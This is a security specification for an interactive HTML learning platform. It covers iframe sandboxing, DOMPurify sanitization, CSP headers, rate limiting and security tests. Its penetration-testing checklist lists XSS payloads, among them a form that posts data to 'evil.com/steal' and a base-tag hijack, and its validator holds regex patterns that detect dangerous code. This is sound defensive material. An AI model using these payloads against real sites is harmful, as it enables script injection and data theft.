# Security Specification: HTML Learning Platform

**Date**: 2026-01-29
**Phase**: Planning
**Agent**: Security Expert
**Status**: Final Specification

---

## Executive Summary

This document provides comprehensive security specifications for the HTML learning platform. Given the project's nature as an **interactive code playground with animations**, the primary security concern is **XSS (Cross-Site Scripting) vulnerabilities** through user-generated HTML content.

**Risk Level**: MEDIUM-HIGH (reduced to LOW-MEDIUM with proper controls)
**Critical Success Factor**: Sandboxed code execution + HTML sanitization

---

## 1. Security Architecture

### 1.1 Core Security Principles

| Principle | Implementation |
|-----------|----------------|
| **Defense in Depth** | Multiple security layers: input validation → sanitization → sandboxing → CSP |
| **Least Privilege** | User code has zero access to parent window, localStorage, or cookies |
| **Fail Securely** | Errors never expose system details; timeouts kill runaway code |
| **Secure by Default** | All features start restricted; permissions explicitly granted |

### 1.2 Security Layers Architecture

```
┌─────────────────────────────────────────────────────────┐
│ Layer 1: HTTPS + Security Headers (Transport Security)  │
├─────────────────────────────────────────────────────────┤
│ Layer 2: Content Security Policy (Policy Enforcement)   │
├─────────────────────────────────────────────────────────┤
│ Layer 3: Input Validation (Length, Type, Format)        │
├─────────────────────────────────────────────────────────┤
│ Layer 4: HTML Sanitization (DOMPurify - Tag Filtering)  │
├─────────────────────────────────────────────────────────┤
│ Layer 5: Sandboxed Iframe (Execution Isolation)         │
├─────────────────────────────────────────────────────────┤
│ Layer 6: Timeout & Resource Limits (DoS Prevention)     │
├─────────────────────────────────────────────────────────┤
│ Layer 7: Monitoring & Logging (Detection & Response)    │
└─────────────────────────────────────────────────────────┘
```

---

## 2. Critical Security Requirements

### 2.1 Sandboxed Code Execution (P0 - CRITICAL)

**Requirement**: All user-written HTML MUST execute in a sandboxed iframe with strict isolation.

**Specification**:

```html
<iframe
  id="preview-frame"
  sandbox="allow-scripts"
  srcdoc="<!-- sanitized user HTML here -->"
  style="border: none; width: 100%; height: 100%;">
</iframe>
```

**Sandbox Attributes Explained**:
- `allow-scripts`: Required for basic HTML functionality (without this, no JS or interactions)
- **MUST NOT include** `allow-same-origin`: Prevents iframe from accessing parent DOM
- **MUST NOT include** `allow-top-navigation`: Prevents iframe from redirecting parent
- **MUST NOT include** `allow-forms`: Prevents form submission to external sites

**Implementation Details**:
- Use `srcdoc` attribute (not `src`) to avoid CORS issues
- Iframe must be regenerated on each code change (prevents state persistence)
- No message passing (`postMessage`) between iframe and parent unless explicitly needed
- Iframe content should not have access to parent's localStorage or cookies

**Security Benefit**: Even if attacker injects malicious code, it's trapped in the sandbox with no access to user data or parent application.

---

### 2.2 HTML Sanitization (P0 - CRITICAL)

**Requirement**: All user HTML MUST be sanitized before rendering, removing dangerous tags and attributes.

**Library**: DOMPurify 3.x (actively maintained, zero dependencies, industry standard)

**Specification**:

```javascript
import DOMPurify from 'dompurify';

const sanitizeUserHTML = (userHTML) => {
  return DOMPurify.sanitize(userHTML, {
    // Allowed tags for educational HTML learning
    ALLOWED_TAGS: [
      // Text content
      'p', 'span', 'div', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'strong', 'em', 'u', 's', 'br', 'hr', 'pre', 'code',
      // Lists
      'ul', 'ol', 'li',
      // Tables
      'table', 'thead', 'tbody', 'tr', 'td', 'th',
      // Links and images
      'a', 'img',
      // Forms (for learning, but note security)
      'form', 'input', 'button', 'label', 'textarea', 'select', 'option',
      // Semantic HTML5
      'header', 'footer', 'nav', 'main', 'section', 'article', 'aside'
    ],

    // Allowed attributes
    ALLOWED_ATTR: [
      'class', 'id', 'style', 'href', 'src', 'alt', 'title',
      'type', 'placeholder', 'value', 'name', 'for',
      'colspan', 'rowspan', 'width', 'height'
    ],

    // Forbidden tags (even if user tries to inject)
    FORBID_TAGS: [
      'script', 'iframe', 'object', 'embed', 'applet',
      'link', 'style', 'meta', 'base', 'svg', 'math'
    ],

    // Forbidden attributes (event handlers and dangerous attrs)
    FORBID_ATTR: [
      'onerror', 'onload', 'onclick', 'onmouseover', 'onmouseout',
      'onfocus', 'onblur', 'onchange', 'onsubmit', 'onkeyup',
      'formaction', 'data', 'xmlns'
    ],

    // Allow data URIs for images (for inline learning examples)
    ALLOW_DATA_ATTR: true,

    // Keep HTML structure clean
    WHOLE_DOCUMENT: false,
    RETURN_DOM: false,
    RETURN_DOM_FRAGMENT: false
  });
};
```

**Additional Validation**:

```javascript
const validateUserHTML = (html) => {
  // Length limit: 50KB max
  if (html.length > 50000) {
    throw new Error('Code too long. Maximum 50,000 characters allowed.');
  }

  // Check for dangerous patterns
  const dangerousPatterns = [
    /javascript:/gi,          // javascript: protocol
    /data:text\/html/gi,      // HTML data URIs
    /vbscript:/gi,            // VBScript protocol
    /<base\s/gi,              // Base tag hijacking
    /document\.write/gi,      // document.write
    /eval\(/gi,               // eval()
    /Function\(/gi            // Function constructor
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(html)) {
      throw new Error('Detected potentially unsafe code pattern. Please review your code.');
    }
  }

  return true;
};
```

**Security Benefit**: Removes all executable code (script tags, event handlers) while preserving educational HTML elements.

---

### 2.3 Content Security Policy (P0 - CRITICAL)

**Requirement**: Strict CSP headers MUST be set to prevent inline script execution and unauthorized resource loading.

**HTTP Headers** (set via Netlify/Vercel config):

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net https://unpkg.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https:;
  frame-src 'self' blob:;
  connect-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
```

**CSP Directives Explained**:
- `default-src 'self'`: Only load resources from same origin by default
- `script-src`: Allow scripts from self and trusted CDNs (for libraries)
- `style-src 'unsafe-inline'`: Required for Tailwind/inline styles (trade-off)
- `object-src 'none'`: Block Flash, Java applets completely
- `frame-ancestors 'none'`: Prevent embedding in iframes (clickjacking protection)

**CSP Violation Reporting** (Phase 3):

```
Content-Security-Policy-Report-Only: ...; report-uri /csp-report-endpoint
```

**Security Benefit**: Even if XSS payload bypasses sanitization, CSP prevents it from executing.

---

### 2.4 HTTPS Enforcement (P0 - CRITICAL)

**Requirement**: All traffic MUST use HTTPS. HTTP should redirect to HTTPS.

**HTTP Header**:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Implementation**:
- Configure hosting provider (Netlify/Vercel) to enforce HTTPS
- Add HSTS preload to browser lists: hstspreload.org
- No mixed content (all external resources must use HTTPS)

**Security Benefit**: Prevents man-in-the-middle attacks, session hijacking, and data interception.

---

### 2.5 Additional Security Headers (P0 - CRITICAL)

**Required HTTP Headers**:

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=()
```

**Headers Explained**:
- `X-Content-Type-Options`: Prevents MIME-type sniffing attacks
- `X-Frame-Options`: Prevents clickjacking (redundant with CSP but defense-in-depth)
- `X-XSS-Protection`: Browser XSS filter (legacy browsers)
- `Referrer-Policy`: Don't leak full URL in referer header
- `Permissions-Policy`: Disable unnecessary browser features

**Implementation**: Add to Netlify `netlify.toml` or Vercel `vercel.json` config:

```toml
# netlify.toml
[[headers]]
  for = "/*"
  [headers.values]
    Strict-Transport-Security = "max-age=31536000; includeSubDomains; preload"
    X-Content-Type-Options = "nosniff"
    X-Frame-Options = "DENY"
    X-XSS-Protection = "1; mode=block"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Permissions-Policy = "geolocation=(), microphone=(), camera=()"
    Content-Security-Policy = "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; frame-src 'self' blob:; object-src 'none'; base-uri 'self'"
```

---

## 3. High Priority Security Requirements

### 3.1 Code Execution Timeout (P1 - HIGH)

**Requirement**: User code execution MUST timeout after 5 seconds to prevent infinite loops and DoS.

**Specification**:

```javascript
class SafeCodeExecutor {
  private timeoutId: number | null = null;
  private iframe: HTMLIFrameElement;

  execute(sanitizedHTML: string): void {
    // Clear any existing timeout
    if (this.timeoutId) {
      clearTimeout(this.timeoutId);
    }

    // Set timeout to kill execution
    this.timeoutId = setTimeout(() => {
      this.killExecution();
    }, 5000); // 5 second timeout

    // Execute code in iframe
    this.iframe.srcdoc = sanitizedHTML;

    // Clear timeout if execution completes normally
    this.iframe.addEventListener('load', () => {
      if (this.timeoutId) {
        clearTimeout(this.timeoutId);
        this.timeoutId = null;
      }
    }, { once: true });
  }

  private killExecution(): void {
    // Destroy and recreate iframe (kills all running code)
    const parent = this.iframe.parentElement;
    const newIframe = this.iframe.cloneNode(false) as HTMLIFrameElement;
    parent?.replaceChild(newIframe, this.iframe);
    this.iframe = newIframe;

    // Show user-friendly error
    this.showError('Execution timeout. Did your code have an infinite loop?');
  }
}
```

**Security Benefit**: Prevents malicious or buggy code from freezing browser or consuming excessive resources.

---

### 3.2 Rate Limiting (P1 - HIGH)

**Requirement**: Limit code executions to prevent abuse and resource exhaustion.

**Specification**:

```javascript
class RateLimiter {
  private executionCount = 0;
  private windowStart = Date.now();
  private readonly maxExecutions = 50; // 50 executions per minute
  private readonly windowMs = 60000; // 1 minute

  canExecute(): boolean {
    const now = Date.now();

    // Reset window if expired
    if (now - this.windowStart > this.windowMs) {
      this.executionCount = 0;
      this.windowStart = now;
    }

    // Check if limit exceeded
    if (this.executionCount >= this.maxExecutions) {
      return false;
    }

    this.executionCount++;
    return true;
  }

  getRemainingTime(): number {
    return this.windowMs - (Date.now() - this.windowStart);
  }
}

// Usage
const limiter = new RateLimiter();

function executeUserCode(code: string): void {
  if (!limiter.canExecute()) {
    const waitTime = Math.ceil(limiter.getRemainingTime() / 1000);
    alert(`Rate limit exceeded. Please wait ${waitTime} seconds before trying again.`);
    return;
  }

  // Proceed with execution
  safeExecutor.execute(code);
}
```

**Security Benefit**: Prevents abuse, spam, and resource exhaustion attacks.

---

### 3.3 Subresource Integrity (SRI) for CDN (P1 - HIGH)

**Requirement**: All external JavaScript/CSS libraries MUST use SRI to prevent supply chain attacks.

**Specification**:

```html
<!-- Anime.js from CDN with SRI -->
<script
  src="https://cdn.jsdelivr.net/npm/animejs@3.2.2/lib/anime.min.js"
  integrity="sha384-[HASH_HERE]"
  crossorigin="anonymous">
</script>

<!-- DOMPurify from CDN with SRI -->
<script
  src="https://cdn.jsdelivr.net/npm/dompurify@3.0.9/dist/purify.min.js"
  integrity="sha384-[HASH_HERE]"
  crossorigin="anonymous">
</script>
```

**Generate SRI Hashes**:

```bash
# Using openssl
curl https://cdn.jsdelivr.net/npm/animejs@3.2.2/lib/anime.min.js | \
  openssl dgst -sha384 -binary | \
  openssl base64 -A

# Or use online tool: srihash.org
```

**Security Benefit**: Ensures CDN files haven't been tampered with. If CDN is compromised, browser won't load the file.

---

### 3.4 Dependency Vulnerability Scanning (P1 - HIGH)

**Requirement**: All npm dependencies MUST be scanned for vulnerabilities before deployment.

**Implementation**:

```json
// package.json scripts
{
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "audit:fix": "npm audit fix",
    "precommit": "npm run audit && npm run build"
  }
}
```

**CI/CD Integration** (.github/workflows/security.yml):

```yaml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm audit --audit-level=moderate
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

**Tools**:
- `npm audit`: Built-in vulnerability scanner
- Snyk: Continuous monitoring (free for open-source)
- Dependabot: Automated dependency updates (GitHub native)

**Security Benefit**: Identifies vulnerable dependencies before they're deployed. Automated alerts for new vulnerabilities.

---

## 4. Medium Priority Security Requirements

### 4.1 Animation Safety (P2 - MEDIUM)

**Requirement**: Animations MUST respect `prefers-reduced-motion` and avoid seizure-inducing patterns.

**Specification**:

```javascript
// Check user's motion preference
const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)');

function safeAnimate(element, properties, options) {
  // If user prefers reduced motion, skip animation
  if (prefersReducedMotion.matches) {
    // Apply final state immediately
    Object.assign(element.style, properties);
    return;
  }

  // Otherwise, animate normally
  anime({
    targets: element,
    ...properties,
    ...options
  });
}

// WCAG 2.3.1: No more than 3 flashes per second
function validateFlashRate(animationConfig) {
  const { duration, iterations } = animationConfig;
  const flashesPerSecond = (iterations / duration) * 1000;

  if (flashesPerSecond > 3) {
    console.warn('Animation exceeds safe flash rate (3 per second). Reducing speed.');
    animationConfig.duration = (iterations / 3) * 1000;
  }

  return animationConfig;
}
```

**WCAG 2.1 AA Compliance**:
- No flashing more than 3 times per second
- Provide toggle to disable all animations
- Respect system preferences (`prefers-reduced-motion`)

**Security Benefit**: Prevents accessibility issues and potential medical harm (photosensitive epilepsy).

---

### 4.2 localStorage Security (P2 - MEDIUM)

**Requirement**: User progress data in localStorage MUST be integrity-checked to prevent tampering.

**Specification**:

```javascript
import CryptoJS from 'crypto-js';

class SecureStorage {
  private readonly SECRET_KEY = 'your-app-specific-secret'; // In production, use env var

  // Save with HMAC integrity check
  save(key: string, data: any): void {
    const json = JSON.stringify(data);
    const hmac = CryptoJS.HmacSHA256(json, this.SECRET_KEY).toString();

    localStorage.setItem(key, json);
    localStorage.setItem(`${key}_hmac`, hmac);
  }

  // Load with integrity verification
  load(key: string): any | null {
    const json = localStorage.getItem(key);
    const storedHmac = localStorage.getItem(`${key}_hmac`);

    if (!json || !storedHmac) return null;

    // Verify integrity
    const computedHmac = CryptoJS.HmacSHA256(json, this.SECRET_KEY).toString();

    if (computedHmac !== storedHmac) {
      console.error('Data integrity check failed. Progress may have been tampered with.');
      this.clear(key); // Clear corrupted data
      return null;
    }

    return JSON.parse(json);
  }

  clear(key: string): void {
    localStorage.removeItem(key);
    localStorage.removeItem(`${key}_hmac`);
  }
}

// Usage
const storage = new SecureStorage();
storage.save('userProgress', { completedLessons: ['lesson-1', 'lesson-2'] });
const progress = storage.load('userProgress');
```

**What NOT to Store**:
- Passwords or credentials
- API keys or tokens
- Personal Identifiable Information (PII)
- Payment information

**Security Benefit**: Detects if user has tampered with progress data to cheat. Prevents client-side manipulation.

---

### 4.3 Input Validation Utilities (P2 - MEDIUM)

**Requirement**: All user inputs MUST be validated before processing.

**Specification**:

```typescript
class InputValidator {
  // Validate code length
  static validateCodeLength(code: string): boolean {
    const MAX_LENGTH = 50000; // 50KB
    if (code.length > MAX_LENGTH) {
      throw new Error(`Code exceeds maximum length of ${MAX_LENGTH} characters.`);
    }
    return true;
  }

  // Validate lesson ID (prevent path traversal)
  static validateLessonId(lessonId: string): boolean {
    const SAFE_PATTERN = /^[a-z0-9-]+$/;
    if (!SAFE_PATTERN.test(lessonId)) {
      throw new Error('Invalid lesson ID format.');
    }
    return true;
  }

  // Validate search query
  static validateSearchQuery(query: string): string {
    const MAX_LENGTH = 200;

    // Trim and limit length
    query = query.trim().slice(0, MAX_LENGTH);

    // Remove HTML tags
    query = query.replace(/<[^>]*>/g, '');

    // Remove special characters that could be used in injection
    query = query.replace(/[<>\"'`;()]/g, '');

    return query;
  }

  // Validate URL (for link checking in lessons)
  static validateURL(url: string): boolean {
    try {
      const parsed = new URL(url);

      // Only allow http/https protocols
      if (!['http:', 'https:'].includes(parsed.protocol)) {
        throw new Error('Invalid URL protocol. Only HTTP/HTTPS allowed.');
      }

      // Optionally whitelist domains
      const ALLOWED_DOMAINS = ['example.com', 'trusted-site.com'];
      // if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
      //   throw new Error('URL domain not whitelisted.');
      // }

      return true;
    } catch (e) {
      throw new Error('Invalid URL format.');
    }
  }
}
```

---

### 4.4 Error Handling (P2 - MEDIUM)

**Requirement**: Error messages MUST NOT expose system details or stack traces to users.

**Specification**:

```typescript
class ErrorHandler {
  static handle(error: Error, context: string): void {
    // Log full error details to console (for developers)
    if (process.env.NODE_ENV === 'development') {
      console.error(`[${context}]`, error);
    }

    // Send to monitoring service in production
    if (process.env.NODE_ENV === 'production') {
      // Sentry.captureException(error, { tags: { context } });
    }

    // Show user-friendly message (never expose stack trace)
    const userMessage = this.getUserFriendlyMessage(error);
    this.showToUser(userMessage);
  }

  private static getUserFriendlyMessage(error: Error): string {
    // Map technical errors to friendly messages
    const messageMaps: Record<string, string> = {
      'NetworkError': 'Unable to connect. Please check your internet connection.',
      'SyntaxError': 'Oops! There might be a typo in your code.',
      'TimeoutError': 'Code execution timeout. Did you create an infinite loop?',
      'RateLimitError': 'Too many attempts. Please wait a moment and try again.'
    };

    return messageMaps[error.name] || 'Something went wrong. Please try again.';
  }

  private static showToUser(message: string): void {
    // Show friendly error notification (not alert)
    // Implementation depends on UI framework
    console.log('User message:', message);
  }
}
```

**Security Benefit**: Prevents information disclosure that attackers could use to plan attacks.

---

## 5. Testing Requirements

### 5.1 Security Unit Tests

**Required Test Cases**:

```typescript
describe('Security - HTML Sanitization', () => {
  test('should remove script tags', () => {
    const malicious = '<script>alert("XSS")</script><p>Safe content</p>';
    const clean = sanitizeUserHTML(malicious);
    expect(clean).not.toContain('<script>');
    expect(clean).toContain('<p>Safe content</p>');
  });

  test('should remove event handlers', () => {
    const malicious = '<img src=x onerror="alert(1)">';
    const clean = sanitizeUserHTML(malicious);
    expect(clean).not.toContain('onerror');
  });

  test('should remove javascript: protocol', () => {
    const malicious = '<a href="javascript:alert(1)">Click</a>';
    const clean = sanitizeUserHTML(malicious);
    expect(clean).not.toContain('javascript:');
  });

  test('should handle nested injection attempts', () => {
    const malicious = '<div><div><script>alert(1)</script></div></div>';
    const clean = sanitizeUserHTML(malicious);
    expect(clean).not.toContain('<script>');
  });

  test('should preserve safe HTML', () => {
    const safe = '<h1>Title</h1><p class="text">Content</p><a href="https://example.com">Link</a>';
    const clean = sanitizeUserHTML(safe);
    expect(clean).toBe(safe);
  });
});

describe('Security - Code Execution Timeout', () => {
  test('should timeout after 5 seconds', async () => {
    const infiniteLoop = '<script>while(true){}</script>';
    const executor = new SafeCodeExecutor();

    const startTime = Date.now();
    executor.execute(infiniteLoop);

    // Wait for timeout
    await new Promise(resolve => setTimeout(resolve, 5500));

    const elapsedTime = Date.now() - startTime;
    expect(elapsedTime).toBeGreaterThanOrEqual(5000);
    expect(elapsedTime).toBeLessThan(6000);
  });
});

describe('Security - Rate Limiting', () => {
  test('should block after 50 executions', () => {
    const limiter = new RateLimiter();

    // Execute 50 times (should succeed)
    for (let i = 0; i < 50; i++) {
      expect(limiter.canExecute()).toBe(true);
    }

    // 51st execution should be blocked
    expect(limiter.canExecute()).toBe(false);
  });
});
```

---

### 5.2 Penetration Testing Checklist

**Manual XSS Testing Payloads** (test in isolated dev environment):

```html
<!-- Basic XSS -->
<script>alert('XSS')</script>

<!-- Event handler XSS -->
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">

<!-- Protocol-based XSS -->
<a href="javascript:alert('XSS')">Click me</a>
<iframe src="javascript:alert('XSS')">

<!-- Encoded XSS -->
&#60;script&#62;alert('XSS')&#60;/script&#62;
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- DOM-based XSS -->
<iframe srcdoc="<script>alert('XSS')</script>">

<!-- CSS injection -->
<style>body{background:url('javascript:alert(1)')}</style>

<!-- Base tag hijacking -->
<base href="https://evil.com/">

<!-- Form hijacking -->
<form action="https://evil.com/steal"><input name="data"></form>
```

**Expected Result**: All payloads should be sanitized or blocked. None should execute.

---

### 5.3 Automated Security Scanning

**Tools to Use**:

1. **OWASP ZAP** (Zed Attack Proxy)
   - Automated vulnerability scanner
   - Run before each release
   - Check for OWASP Top 10 vulnerabilities

2. **npm audit**
   - Scan dependencies for known vulnerabilities
   - Run in CI/CD pipeline
   - Fail build if high/critical vulnerabilities found

3. **Snyk**
   - Continuous monitoring
   - Automated pull requests for fixes
   - Free for open-source projects

4. **Lighthouse Security Audit**
   - Built into Chrome DevTools
   - Check HTTPS, CSP, mixed content
   - Score target: 90+

**CI/CD Integration**:

```yaml
# .github/workflows/security.yml
name: Security Checks
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3

      - name: Install dependencies
        run: npm ci

      - name: Run npm audit
        run: npm audit --audit-level=high

      - name: Run Snyk scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: Build application
        run: npm run build

      - name: Run OWASP ZAP scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'http://localhost:3000'
```

---

## 6. Privacy & Compliance

### 6.1 GDPR Compliance (If Serving EU Users)

**Requirements**:

1. **Consent for Data Storage**
   - Show cookie/localStorage consent banner on first visit
   - Allow users to opt-out
   - Respect "Do Not Track" signals

2. **Data Export**
   - Provide "Download My Data" button (exports progress as JSON)

3. **Right to Deletion**
   - Provide "Delete My Progress" button (clears all localStorage)

4. **Privacy Policy**
   - Clearly state what data is collected (only progress, no PII)
   - State data is stored locally, not on servers
   - Provide contact email for privacy requests

**Implementation**:

```javascript
// Consent banner component
class ConsentBanner {
  show(): void {
    if (!localStorage.getItem('consent_given')) {
      // Show banner with "Accept" and "Decline" buttons
      // On Accept: localStorage.setItem('consent_given', 'true')
      // On Decline: Don't use localStorage, session-only
    }
  }
}

// Data export
function exportUserData(): void {
  const data = {
    progress: storage.load('userProgress'),
    preferences: storage.load('userPreferences'),
    exportDate: new Date().toISOString()
  };

  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'my-html-learning-data.json';
  a.click();
}

// Data deletion
function deleteAllUserData(): void {
  if (confirm('Are you sure? This will delete all your progress.')) {
    localStorage.clear();
    location.reload();
  }
}
```

---

### 6.2 COPPA Compliance (If Targeting Children <13)

**Recommendation**: Age gate or assume general audience (13+).

If allowing children <13:
- Require parental consent (email verification)
- No collection of personal info (name, email, location)
- No behavioral tracking or advertising
- Simplified privacy policy for children

**Implementation**:

```javascript
// Age gate on first visit
function checkAge(): void {
  const age = parseInt(prompt('How old are you?'));

  if (age < 13) {
    alert('You need a parent or guardian to use this site. Please ask them to visit with you!');
    // Redirect to parental consent page or disable features
  }
}
```

---

## 7. Incident Response Plan

### 7.1 Security Incident Procedure

**1. Detection**:
- CSP violation spike in logs
- User reports suspicious behavior
- Dependency vulnerability alert (Snyk/Dependabot)
- Error rate spike in monitoring

**2. Assessment**:
- Severity: P0 (Critical), P1 (High), P2 (Medium), P3 (Low)
- Scope: How many users affected?
- Impact: Data breach? Service disruption? XSS exploit?

**3. Containment**:
- P0/P1: Take site offline immediately if actively exploited
- Deploy emergency patch or disable affected feature
- Notify hosting provider if infrastructure issue

**4. Eradication**:
- Fix vulnerability in code
- Update vulnerable dependencies
- Conduct code review of fix

**5. Recovery**:
- Test fix in staging environment
- Deploy to production
- Monitor for recurrence

**6. Post-Incident**:
- Document timeline and root cause
- Update security controls to prevent recurrence
- Notify affected users (if data breach)
- Update security documentation

---

### 7.2 Emergency Contacts

| Role | Responsibility | Contact |
|------|----------------|---------|
| Security Lead | Coordinate response | [To be assigned] |
| Senior Developer | Deploy emergency fixes | [To be assigned] |
| Project Manager | User communication | [To be assigned] |
| Hosting Provider | Infrastructure issues | Netlify/Vercel support |

---

## 8. Deployment Security Checklist

**Before Launch**:

- [ ] All security headers configured (HSTS, CSP, X-Frame-Options, etc.)
- [ ] HTTPS enforced with valid SSL certificate
- [ ] DOMPurify HTML sanitization implemented and tested
- [ ] Sandboxed iframe for code execution
- [ ] Code execution timeout (5 seconds)
- [ ] Rate limiting on code execution
- [ ] Input validation on all user inputs
- [ ] SRI hashes on all CDN resources
- [ ] npm audit passing (no high/critical vulnerabilities)
- [ ] Security unit tests passing
- [ ] Manual XSS testing completed
- [ ] OWASP ZAP scan completed
- [ ] Error messages don't expose system details
- [ ] Privacy policy published
- [ ] GDPR consent banner (if applicable)
- [ ] Monitoring/logging configured

**Post-Launch Monitoring**:

- [ ] CSP violation reports reviewed weekly
- [ ] Dependency updates applied monthly
- [ ] Error logs reviewed daily
- [ ] Security scan run quarterly
- [ ] User reports of suspicious behavior tracked

---

## 9. Developer Security Guidelines

### 9.1 Secure Coding Rules

**NEVER**:
- ❌ Use `innerHTML` with unsanitized user input
- ❌ Use `eval()` or `Function()` constructor
- ❌ Use `document.write()` (can overwrite entire page)
- ❌ Trust client-side data (always validate on server if backend exists)
- ❌ Hardcode secrets (API keys, passwords) in code
- ❌ Use `target="_blank"` without `rel="noopener noreferrer"`
- ❌ Allow user-controlled URLs in `window.location` or `iframe.src` without validation

**ALWAYS**:
- ✅ Sanitize HTML with DOMPurify before rendering
- ✅ Use `textContent` or `innerText` for plain text (not `innerHTML`)
- ✅ Validate all user inputs (length, type, format)
- ✅ Use parameterized queries (if backend added later)
- ✅ Keep dependencies updated (`npm audit` regularly)
- ✅ Use HTTPS for all external resources
- ✅ Add SRI hashes to CDN scripts
- ✅ Log security events (CSP violations, rate limit hits)

---

### 9.2 Code Review Security Checklist

When reviewing code, check:

- [ ] User inputs are validated before use
- [ ] HTML content is sanitized before rendering
- [ ] No `innerHTML` with user data (or sanitized if necessary)
- [ ] No `eval()` or `Function()` usage
- [ ] External URLs are validated
- [ ] Error messages don't expose system details
- [ ] Sensitive data not logged
- [ ] Dependencies are up-to-date
- [ ] No hardcoded secrets

---

## 10. Implementation Priority

### Phase 1: CRITICAL (Must-Have Before Launch)

| Task | Owner | Effort | Timeline |
|------|-------|--------|----------|
| Implement sandboxed iframe for code execution | Senior Dev | 1 day | Sprint 1 |
| Integrate DOMPurify HTML sanitization | Senior Dev | 1 day | Sprint 1 |
| Configure CSP headers | Senior Dev | 0.5 day | Sprint 1 |
| Enforce HTTPS + HSTS | Senior Dev | 0.5 day | Sprint 1 |
| Add security headers (X-Frame-Options, etc.) | Senior Dev | 0.5 day | Sprint 1 |
| Input validation utilities | Senior Dev | 1 day | Sprint 1 |

**Total Phase 1**: 4.5 days

---

### Phase 2: HIGH (Should-Have Before Launch)

| Task | Owner | Effort | Timeline |
|------|-------|--------|----------|
| Code execution timeout mechanism | Senior Dev | 1 day | Sprint 2 |
| Rate limiting on code execution | Senior Dev | 1 day | Sprint 2 |
| Add SRI to CDN resources | Senior Dev | 0.5 day | Sprint 2 |
| Set up npm audit in CI/CD | Senior Dev | 0.5 day | Sprint 2 |
| Security unit tests | Senior Dev | 2 days | Sprint 2 |
| Manual XSS testing | Security Expert | 1 day | Sprint 2 |

**Total Phase 2**: 6 days

---

### Phase 3: MEDIUM (Post-Launch)

| Task | Owner | Effort | Timeline |
|------|-------|--------|----------|
| CSP violation logging | Senior Dev | 1 day | Post-launch Week 1 |
| Animation safety (reduced-motion) | Senior Dev | 1 day | Post-launch Week 1 |
| localStorage integrity checks | Senior Dev | 1 day | Post-launch Week 2 |
| Error monitoring (Sentry) | Senior Dev | 0.5 day | Post-launch Week 2 |
| GDPR consent banner | Senior Dev | 1 day | Post-launch Week 2 |
| Privacy policy page | PM | 0.5 day | Post-launch Week 2 |

**Total Phase 3**: 5 days

---

### Phase 4: LOW (Long-Term)

| Task | Owner | Effort | Timeline |
|------|-------|--------|----------|
| Bug bounty program | PM | 1 day | Post-launch Month 2 |
| Third-party penetration test | External | 3-5 days | Post-launch Month 3 |
| Security documentation for users | PM | 1 day | Post-launch Month 2 |

---

## 11. Summary

### Overall Security Posture

**Current Risk Level**: MEDIUM-HIGH (interactive code playground)
**Target Risk Level**: LOW-MEDIUM (with all controls implemented)

### Critical Success Factors

1. **Sandboxed iframe execution** - Isolates user code completely
2. **DOMPurify sanitization** - Removes malicious HTML/JS
3. **Strict CSP** - Prevents inline script execution
4. **HTTPS enforcement** - Protects data in transit
5. **Code execution timeout** - Prevents DoS attacks

### Risk Acceptance

With Phase 1 (CRITICAL) and Phase 2 (HIGH) controls implemented, the platform will have **robust security suitable for public launch**.

---

## 12. Delegation to Other Teams

### DELEGATE TO ARCHITECT:
- Design detailed sandboxed iframe architecture with communication protocols
- Plan CSP header configuration for hosting provider
- Design session management if user accounts added later
- Plan rate limiting architecture (client-side vs server-side)

### DELEGATE TO SENIOR DEVELOPER:
- Implement DOMPurify sanitization wrapper with config
- Build SafeCodeExecutor class with timeout mechanism
- Configure security headers in Netlify/Vercel config
- Implement RateLimiter class
- Add SRI hashes to all CDN resources
- Set up npm audit and Snyk in CI/CD
- Write security unit tests
- Implement SecureStorage class for localStorage
- Add animation safety checks (prefers-reduced-motion)

### DELEGATE TO UI/UX DESIGNER:
- Design user-friendly security error messages (timeout, rate limit)
- Design GDPR consent banner (friendly, not scary)
- Design "Safe Mode" toggle for cautious users
- Design accessibility warnings for animations
- Design privacy policy page layout

### DELEGATE TO PM:
- Prioritize security tasks in sprint planning
- Allocate 10-11 developer days for security implementation
- Schedule security review before launch
- Plan bug bounty program for post-launch
- Draft privacy policy content
- Plan incident response communication strategy

---

## 13. References

### Security Standards
- OWASP Top 10 (2025): https://owasp.org/Top10/
- OWASP XSS Prevention Cheat Sheet
- OWASP Content Security Policy Cheat Sheet
- OWASP HTML Sanitization Cheat Sheet

### Libraries & Tools
- DOMPurify: https://github.com/cure53/DOMPurify
- OWASP ZAP: https://www.zaproxy.org/
- Snyk: https://snyk.io/
- SRI Hash Generator: https://www.srihash.org/

### Testing Resources
- XSS Filter Evasion Cheat Sheet
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
- Security Headers Check: https://securityheaders.com/

### Compliance
- GDPR Guide: https://gdpr.eu/
